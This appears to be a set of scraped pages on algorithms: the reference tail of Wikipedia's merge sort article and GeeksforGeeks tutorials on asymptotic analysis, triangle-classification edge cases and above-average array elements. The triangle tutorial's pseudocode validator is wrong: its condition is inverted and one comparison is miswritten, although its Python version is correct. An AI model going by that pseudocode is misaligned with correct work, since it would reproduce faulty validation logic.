^ Powers, David M. W. (1991). "Parallelized Quicksort and Radixsort with Optimal Speedup". Proceedings of International Conference on Parallel Computing Technologies, Novosibirsk. Archived from the original on 2007-05-25. ^ Powers, David M. W. (January 1995). Parallel Unification: Practical Complexity (PDF). Australasian Computer Architecture Workshop Flinders University. ^ "Sort – Perl 5 version 8.8 documentation". Retrieved 2020-08-23. ^ coleenp (22 Feb 2019). "src/java.base/share/classes/java/util/Arrays.java @ 53904:9c3fe09f69bc". OpenJDK. ^ linux kernel /lib/list_sort.c ^ jjb (29 Jul 2009). "Commit 6804124: Replace "modified mergesort" in java.util.Arrays.sort with timsort". Java Development Kit 7 Hg repo. Archived from the original on 2018-01-26. Retrieved 24 Feb 2011. ^ "Class: java.util.TimSort<T>". Android JDK Documentation. Archived from the original on January 20, 2015. Retrieved 19 Jan 2015. ^ "liboctave/util/oct-sort.cc". Mercurial repository of Octave source code. Lines 23-25 of the initial comment block. Retrieved 18 Feb 2013. Code stolen in large part from Python's, listobject.c, which itself had no license header. However, thanks to Tim Peters for the parts of the code I ripped-off. References[edit] Cormen, Thomas H.; Leiserson, Charles E.; Rivest, Ronald L.; Stein, Clifford (2009) [1990]. Introduction to Algorithms (3rd ed.). MIT Press and McGraw-Hill. ISBN 0-262-03384-4. Katajainen, Jyrki; Pasanen, Tomi; Teuhola, Jukka (1996). "Practical in-place mergesort". Nordic Journal of Computing. 3 (1): 27–40. CiteSeerX 10.1.1.22.8523. ISSN 1236-6064. Archived from the original on 2011-08-07. Retrieved 2009-04-04.. Also Practical In-Place Mergesort. Also [3] Knuth, Donald (1998). "Section 5.2.4: Sorting by Merging". Sorting and Searching. The Art of Computer Programming. 3 (2nd ed.). Addison-Wesley. pp. 158–168. ISBN 0-201-89685-0. Kronrod, M. A. (1969). "Optimal ordering algorithm without operational field". Soviet Mathematics - Doklady. 10: 744. LaMarca, A.; Ladner, R. E. (1997). "The influence of caches on the performance of sorting". Proc. 8th Ann. ACM-SIAM Symp. On Discrete Algorithms (SODA97): 370–379. CiteSeerX 10.1.1.31.1153. Skiena, Steven S. (2008). "4.5: Mergesort: Sorting by Divide-and-Conquer". The Algorithm Design Manual (2nd ed.). Springer. pp. 120–125. ISBN 978-1-84800-069-8. Sun Microsystems. "Arrays API (Java SE 6)". Retrieved 2007-11-19. Oracle Corp. "Arrays (Java SE 10 & JDK 10)". Retrieved 2018-07-23. External links[edit] The Wikibook Algorithm implementation has a page on the topic of: Merge sort Animated Sorting Algorithms: Merge Sort at the Wayback Machine (archived 6 March 2015) – graphical demonstration Open Data Structures - Section 11.1.1 - Merge Sort, Pat Morin vteSorting algorithmsTheory Computational complexity theory Big O notation Total order Lists Inplacement Stability Comparison sort Adaptive sort Sorting network Integer sorting X + Y sorting Transdichotomous model Quantum sort Exchange sorts Bubble sort Cocktail shaker sort Odd–even sort Comb sort Gnome sort Quicksort Slowsort Stooge sort Bogosort Selection sorts Selection sort Heapsort Smoothsort Cartesian tree sort Tournament sort Cycle sort Weak-heap sort Insertion sorts Insertion sort Shellsort Splaysort Tree sort Library sort Patience sorting Merge sorts Merge sort Cascade merge sort Oscillating merge sort Polyphase merge sort Distribution sorts American flag sort Bead sort Bucket sort Burstsort Counting sort Interpolation sort Pigeonhole sort Proxmap sort Radix sort Flashsort Concurrent sorts Bitonic sorter Batcher odd–even mergesort Pairwise sorting network Samplesort Hybrid sorts Block merge sort Kirkpatrick-Reisch sort Timsort Introsort Spreadsort Merge-insertion sort Other Topological sorting Pre-topological order Pancake sorting Spaghetti sort Retrieved from "https://en.wikipedia.org/w/index.php?title=Merge_sort&oldid=994955155" Categories: Sorting algorithmsComparison sortsStable sortsDivide-and-conquer algorithmsHidden categories: Harv and Sfn no-target errorsArticles with short descriptionShort description is different from WikidataArticles that may contain original research from May 2016All articles that may contain original researchAll articles with unsourced statementsArticles with unsourced statements from June 2008All articles needing examplesArticles needing examples from August 2016Articles with unsourced statements from March 2014Webarchive template wayback linksArticles with example pseudocode Navigation menu Personal tools Not logged inTalkContributionsCreate accountLog in Namespaces ArticleTalk Variants Views ReadEditView history More Search Navigation Main pageContentsCurrent eventsRandom articleAbout WikipediaContact usDonate Contribute HelpLearn to editCommunity portalRecent changesUpload file Tools What links hereRelated changesUpload fileSpecial pagesPermanent linkPage informationCite this pageWikidata item Print/export Download as PDFPrintable version In other projects Wikimedia Commons Languages العربيةAzərbaycancaБългарскиČeštinaDanskDeutschEestiΕλληνικάEspañolEsperantoفارسیFrançais한국어Հայերենहिन्दीBahasa IndonesiaÍslenskaItalianoעבריתҚазақшаLëtzebuergeschLietuviųLumbaartമലയാളംNederlands日本語Norsk bokmålPolskiPortuguêsRomânăРусскийSimple EnglishSlovenčinaSlovenščinaСрпски / srpskiSuomiSvenskaไทยTürkçeУкраїнськаTiếng Việt粵語中文 Edit links This page was last edited on 18 December 2020, at 12:08 (UTC). Text is available under the Creative Commons Attribution-ShareAlike License; additional terms may apply. By using this site, you agree to the Terms of Use and Privacy Policy. Wikipedia® is a registered trademark of the Wikimedia Foundation, Inc., a non-profit organization. Privacy policy About Wikipedia Disclaimers Contact Wikipedia Mobile view Developers Statistics Cookie statement

Analysis of Algorithms | Set 1 (Asymptotic Analysis) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortUnderstanding Time Complexity with Simple Examples Analysis of Algorithms | Set 1 (Asymptotic Analysis) Last Updated: 09-11-2020 Why performance analysis? There are many important things that should be taken care of, like user friendliness, modularity, security, maintainability, etc. Why to worry about performance? The answer to this is simple, we can have all the above things only if we have performance. So performance is like currency through which we can buy all the above things. Another reason for studying performance is – speed is fun! To summarize, performance == scale. Imagine a text editor that can load 1000 pages, but can spell check 1 page per minute OR an image editor that takes 1 hour to rotate your image 90 degrees left OR … you get it. If a software feature can not cope with the scale of tasks users need to perform – it is as good as dead. Given two algorithms for a task, how do we find out which one is better? One naive way of doing this is – implement both the algorithms and run the two programs on your computer for different inputs and see which one takes less time. There are many problems with this approach for analysis of algorithms. 1) It might be possible that for some inputs, first algorithm performs better than the second. And for some inputs second performs better. 2) It might also be possible that for some inputs, first algorithm perform better on one machine and the second works better on other machine for some other inputs. Asymptotic Analysis is the big idea that handles above issues in analyzing algorithms. In Asymptotic Analysis, we evaluate the performance of an algorithm in terms of input size (we don’t measure the actual running time). We calculate, how the time (or space) taken by an algorithm increases with the input size. For example, let us consider the search problem (searching a given item) in a sorted array. One way to search is Linear Search (order of growth is linear) and the other way is Binary Search (order of growth is logarithmic). To understand how Asymptotic Analysis solves the above mentioned problems in analyzing algorithms, let us say we run the Linear Search on a fast computer A and Binary Search on a slow computer B and we pick the constant values for the two computers so that it tells us exactly how long it takes for the given machine to perform the search in seconds. Let’s say the constant for A is 0.2 and the constant for B is 1000 which means that A is 5000 times more powerful than B. For small values of input array size n, the fast computer may take less time. But, after a certain value of input array size, the Binary Search will definitely start taking less time compared to the Linear Search even though the Binary Search is being run on a slow machine. The reason is the order of growth of Binary Search with respect to input size is logarithmic while the order of growth of Linear Search is linear. So the machine dependent constants can always be ignored after a certain value of input size. Here are some running times for this example: Linear Search running time in seconds on A: 0.2 * n Binary Search running time in seconds on B: 1000*log(n) ------------------------------------------------ |n | Running time on A | Running time on B | ------------------------------------------------- |10 | 2 sec | ~ 1 h | ------------------------------------------------- |100 | 20 sec | ~ 1.8 h | ------------------------------------------------- |10^6 | ~ 55.5 h | ~ 5.5 h | ------------------------------------------------- |10^9 | ~ 6.3 years | ~ 8.3 h | ------------------------------------------------- Does Asymptotic Analysis always work? Asymptotic Analysis is not perfect, but that’s the best way available for analyzing algorithms. For example, say there are two sorting algorithms that take 1000nLogn and 2nLogn time respectively on a machine. Both of these algorithms are asymptotically same (order of growth is nLogn). So, With Asymptotic Analysis, we can’t judge which one is better as we ignore constants in Asymptotic Analysis. Also, in Asymptotic analysis, we always talk about input sizes larger than a constant value. It might be possible that those large inputs are never given to your software and an algorithm which is asymptotically slower, always performs better for your particular situation. So, you may end up choosing an algorithm that is Asymptotically slower but faster for your software. Next – Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) References: MIT’s Video lecture 1 on Introduction to Algorithms. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 3 (Asymptotic Notations)Asymptotic Analysis and comparison of sorting algorithmsProperties of Asymptotic NotationsAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of algorithms | little o and little omega notationsAnalysis of Algorithm | Set 4 (Solving Recurrences)Practice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchDifference between Posteriori and Priori analysisComplexity analysis of various operations of Binary Min HeapExamples of Big-O analysisAlgorithms | Recurrences | Set 1Improved By : Danail Kozhuharov, biplab_prasad, BenceAment Article Tags : AnalysisArticles thumb_up 299 To-do Done 1.3 Based on 498 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Pure Functions Next last_page Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Complexity of different operations in Binary tree, Binary Search Tree and AVL treeProof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemPractice Questions on Time Complexity AnalysisComplexity Analysis of Binary Search Most visited in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Practice for cracking any coding interview room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Don’t Forget The Edge Cases ! - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...What is Memory Leak? How can we avoid?Tree Traversals (Inorder, Preorder and Postorder)Must Do Coding Questions Company-wisePractice for cracking any coding interviewCommonly Asked Data Structure Interview Questions | Set 1Analysis of Algorithms | Set 1 (Asymptotic Analysis)SQL | Join (Inner, Left, Right and Full Joins)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Mutex vs SemaphoreUnderstanding "extern" keyword in CHow to write a Pseudo Code?find command in Linux with examplesAnalysis of Algorithms | Set 4 (Analysis of Loops)OOPs | Object Oriented DesignSQL | GROUP BYData Structures and Algorithms Online Courses : Free and PaidRecursive Practice Problems with SolutionsSQL Interview QuestionsStorage for Strings in CSQL | ORDER BYSQL | ViewsNP-Completeness | Set 1 (Introduction)Little and Big Endian MysteryHow Content Writing at GeeksforGeeks works?Recursive FunctionsWhat is Memory Leak? How can we avoid?SQL | INSERT INTO StatementDo not use sizeof for array parameters Don’t Forget The Edge Cases ! Last Updated: 25-01-2018 Imagine a scenario where you want to write the following function as a part of some larger project : Write a function to return the type of a triangle based on the value of the length of 3 sides of a triangle. Let’s make it a bit more easy, by assuming that test for input data type is already in place, so you receive only numeric values to work with. The situation looks easy you go ahead and write the function which looks something like this – Algorithm : Input : 3 numeric values Output : 1 string stating type of triangle Function : triangleType(side1, side2, side3) Start : 1. If side1 == side2 == side3 Then Return “Equilateral Triangle” 2. Else if side1 == side2 or side1 == side3 or side2 == side3 Then Return “Isosceles Triangle” 3. Else Return “Scalar Triangle” Stop After you complete the function, you are given a couple of assertions to perform. And to your surprise, you find that only 50% of the cases passed. Let's look at the test statements. The ones that pass are : 1. Assert if (String_toLowerCase(triangle_type(6,7,8))==”scalar triangle”) = Correct 2. Assert if (String_toLowerCase(triangle_type(6,6,6))==”equilateral triangle”) = Correct 3. assert(String_toLowerCase(triangle_type(6,7,6))==”isosceles triangle”) = Correct Well, things look good up till here. But the ones that fail are : 4. Assert if (String_toLowerCase(triangle_type(0,0,0))==”not a triangle”) = Incorrect 5. Assert if (String_toLowerCase(triangel_type(-6,-7,-8))==”not a triangle”) = Incorrect 6. Assert if (String_toLowerCase(triangle_type(5,3,8))==”not a triangle”) = Incorrect In the 4th statement input values are (0,0,0). Now we know that (0,0,0) form a point and not a triangle. In fact if any input value is zero, the triangle is not possible. But in our case, it will return equilateral triangle! Also, the 5th statement reminds us that the length can never be a negative value. You see a scale that is -30 cm long. Thus, if we have even one -ve value of length, the triangle is not possible. But in our case depending on the value it may return any of the 3 results. Here it returns a scalar. Now, what about the 6th statement. All values are >= 0, and it surely is a scalar triangle. Or is it? Remember the rule that in a triangle sum of 2 sides is always greater than the 3rd. Here we see for : 8 + 3 > 5 8 + 5 > 3 5 + 3 > 8 Output : True True False It fails the test of triangularity. Hence lengths (3,5,8) do not form a triangle. So what we need is a kind of triangle validation in place, which tells us if what we have is even a triangle or not. As part of the solution you write another function that looks like : Algorithm : Input : 3 sides of the triangle Output : Boolean value: True if 3 sides form a triangle, false otherwise Function : triangleValidator(side1, side2, side3) Start 1. If (side1 <= 0 or side2 <= 0 or side3 <= 0) and (side2 + side3 > side1) and (side3 + side1 > side1) then return True 3. Return False Stop Our previous function now includes 2 extra lines at the beginning and wola! all are tests are passing now. This is just a simple an example scenario to remind us that when we writing production level code, we have to be careful with even simple things. By keeping the simple edge cases in mind, and checking with uniform string cases, we increased our test coverage and made our program return more mathematically correct results. Below is the implementation of above approach : filter_none edit close play_arrow link brightness_4 code # Check if given sides form a triangle or not def triangleValidator(side1, side2 , side3): if side1 <= 0 or side2 <= 0 or side3 <= 0: return False elif (side1 + side2 > side3) and\ (side2 + side3 > side1) and\ (side3 + side1 > side2): return True return False # Return the type of trinagle def triangleType(side1, side2, side3): # If not a triangle, return "Not a triangle" if triangleValidator(side1, side2, side3) == False: return "Not A Triangle" # Else perform type checking if side1 == side2 == side3: return "Equilateral Triangle" elif (side1 == side2) or\ (side2 == side3) or\ (side3 == side1): return "Isoceles Triangle" return "Scalar Triangle" assert (triangleType(6,7,8).lower() == "scalar triangle") assert (triangleType(6,6,6).lower() == "equilateral triangle") assert (triangleType(6,7,6).lower() == "isoceles triangle") assert (triangleType(0,0,0).lower() == "not a triangle") assert (triangleType(-6,-7,-8).lower() == "not a triangle") assert (triangleType(5,3,8).lower() == "not a triangle") chevron_right filter_none Upon successful completion, no output is returned, indicating that all tests have passed. Output : No output My Personal Notes arrow_drop_up Save Recommended Posts:Designing Use Cases for a ProjectDynamoDB: Understand The Benefits With Real Life Use CasesTop Data Science Use Cases in Finance SectorAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Cross Browser Testing - How To Run, Cases, Tools & Common IssuesEdge Computing – A Building Block for Smart Applications of the FutureEdge ComputingWhat is Edge Computing and Its Importance in the Future?10 Applications of IoT in Creating Smart CitiesHow Does Netflix Use Machine Learning?7 Key Tips to Crack the GATE Exam in First Attempt7 Progressive Web App Development Frameworks to Know in 2021Industrial RobotsStart Your Preparation for Wipro Elite NTH 2021 NOW!Sarah MasudCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : ArticlesGBlog thumb_up 3 To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Django Introduction and Installation Next last_page Cloud Based Services Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Articles Proof that SAT is NP CompleteGeneration of Programming LanguagesRunning Python script on GPU.getch() function in C with ExamplesStructure Member Alignment, Padding and Data Packing Most visited in GBlog 100 Days of Code - A Complete Guide For Beginners and ExperiencedWhy Java Language is Slower Than CPP for Competitive Programming?Socket Programming in C/C++GET and POST requests using PythonDifferences between Procedural and Object Oriented Programming room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Find array elements that are greater than average - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...What is Memory Leak? How can we avoid?Tree Traversals (Inorder, Preorder and Postorder)Must Do Coding Questions Company-wisePractice for cracking any coding interviewCommonly Asked Data Structure Interview Questions | Set 1Analysis of Algorithms | Set 1 (Asymptotic Analysis)SQL | Join (Inner, Left, Right and Full Joins)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Mutex vs SemaphoreUnderstanding "extern" keyword in CHow to write a Pseudo Code?find command in Linux with examplesAnalysis of Algorithms | Set 4 (Analysis of Loops)OOPs | Object Oriented DesignSQL | GROUP BYData Structures and Algorithms Online Courses : Free and PaidRecursive Practice Problems with SolutionsSQL Interview QuestionsStorage for Strings in CSQL | ORDER BYSQL | ViewsNP-Completeness | Set 1 (Introduction)Little and Big Endian MysteryHow Content Writing at GeeksforGeeks works?Recursive FunctionsWhat is Memory Leak? How can we avoid?SQL | INSERT INTO StatementDo not use sizeof for array parameters Find array elements that are greater than average Last Updated: 30-05-2018 Given an array of numbers, print all those elements that are greater than average. Examples: Input : 5, 4, 6, 9, 10 Output : 9 10 Explanation: avg = 5 + 4 + 6 + 9 + 10 / 5; avg = 34 / 5 avg = 6.8 Elements greater than 6.8 are 9 and 10 Input : 1, 2, 4, 0, 5 Output : 4 5 Recommended: Please try your approach on {IDE} first, before moving on to the solution. 1) Find average of elements. 2) Traverse array again and print elements that are greater than average, C++ filter_none edit close play_arrow link brightness_4 code // A C++ program to print elements which are // greater than avg of array #include <iostream> using namespace std; // Print array elements greater than average void printAboveAvg(int arr[], int n) { // Find average double avg = 0; for (int i = 0; i < n; i++) avg += arr[i]; avg = avg / n; // Print elements greater than average for (int i = 0; i < n; i++) if (arr[i] > avg) cout << arr[i] << " "; } // Driver program int main() { int arr[] = { 5, 4, 6, 9, 10 }; int a = sizeof(arr) / sizeof(arr[0]); printAboveAvg(arr, a); return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // A Java program to print elements which are // greater than avg of array import java.io.*; class GFG { // Print array elements greater than average static void printAboveAvg(int arr[], int n) { // Find average double avg = 0; for (int i = 0; i < n; i++) avg += arr[i]; avg = avg / n; // Print elements greater than average for (int i = 0; i < n; i++) if (arr[i] > avg) System.out.print(arr[i] + " "); } // Driver program public static void main (String[] args) { int arr[] = { 5, 4, 6, 9, 10 }; int a = arr.length; printAboveAvg(arr, a); } } // This code is contributed by anuj_67. chevron_right filter_none Python3 filter_none edit close play_arrow link brightness_4 code # python program to print elements # which are greater than avg of # array # Print array elements greater # than average def printAboveAvg(arr, a): # Find average avg = 0 for i in range(a): avg = avg + arr[i] avg = avg // a # Print elements greater than # average for i in range(a): if arr[i] > avg: print(arr[i], end = " ") # Driver Program arr = [5, 4, 6, 9, 10] a = len(arr) printAboveAvg(arr, a) # This code is contributed # by Shrikant13. chevron_right filter_none PHP filter_none edit close play_arrow link brightness_4 code <?php // A PHP program to print // elements which are // greater than avg of array // Print array elements // greater than average function printAboveAvg( $arr, $n) { // Find average $avg = 0; for ($i = 0; $i < $n; $i++) $avg += $arr[$i]; $avg = $avg / $n; // Print elements greater // than average for ($i = 0; $i < $n; $i++) if ($arr[$i] > $avg) echo $arr[$i] , " "; } // Driver Code $arr = array(5, 4, 6, 9, 10); $a = count($arr); printAboveAvg($arr, $a); // This code is contributed by anuj_67. ?> chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // A C# program to print elements which are // greater than avg of array using System; using System.Collections.Generic; class GFG { // Print array elements // greater than average static void printAboveAvg(int []arr, int n) { // Find average double avg = 0; for (int i = 0; i < n; i++) avg += arr[i]; avg = avg / n; // Print elements greater // than average for (int i = 0; i < n; i++) if (arr[i] > avg) Console.Write(arr[i] + " "); } // Driver Code public static void Main() { int []arr = {5, 4, 6, 9, 10}; int a = arr.Length; printAboveAvg(arr, a); } } // This code is contributed by // Manish Shaw (manishshaw1) chevron_right filter_none Output: 9 10 My Personal Notes arrow_drop_up Save Recommended Posts:Highest and Smallest power of K less than and greater than equal to N respectivelyMinimum value to be assigned to the elements so that sum becomes greater than initial sumFind the Next perfect square greater than a given numberFind the average of first N natural numbersFind the Batting Average of a batsmanAverage numbers in arraySmallest integer greater than n such that it consists of digit m exactly k timesCount ways to divide C in two parts and add to A and B to make A strictly greater than BSmallest number greater than or equal to X whose sum of digits is divisible by YSmallest number greater than or equal to N using only digits 1 to KSmallest number greater than Y with sum of digits equal to XCount of array elements which is smaller than both its adjacent elementsCheck whether the Average Character of the String is present or notAverage of Cubes of first N natural numbersAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Count of greater elements for each element in the ArrayFind the next greater element in a Circular ArrayReplace array elements by sum of next two consecutive elementsProgram to find sum of elements in a given arrayFind the first, second and third minimum elements in an arrayAliezCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below.Improved By : shrikanth13, vt_m, manishshaw1 Article Tags : ArticlesSchool Programming thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Program to calculate value of nCr Next last_page Program for scalar multiplication of a matrix Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Articles Proof that SAT is NP CompleteGeneration of Programming LanguagesRunning Python script on GPU.getch() function in C with ExamplesStructure Member Alignment, Padding and Data Packing Most visited in School Programming Inheritance in C++Arrays in C/C++Reverse a string in JavaPython DictionaryConstructors in C++ room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

